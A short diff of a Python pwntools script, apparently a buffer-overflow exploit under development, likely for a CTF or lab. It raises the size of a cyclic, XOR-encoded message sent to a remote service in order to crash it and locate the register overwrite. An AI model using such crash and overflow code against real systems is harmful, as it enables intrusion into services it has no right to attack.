@@ -45,7 +45,7 @@ if __name__ == "__main__":
     io = remote(host,int(port))
     #size = 32*4096 # No crash
     # xor key is 32*4 = 128 bytes
-    message_size = 32*4096+16 # crash
+    message_size = 32*4096+100 # crash
     message = cyclic(message_size) #Generate unique string to help determin payload register overwrite
     xor_message = doEncryption(message)
     message = doEncryption(xor_message)
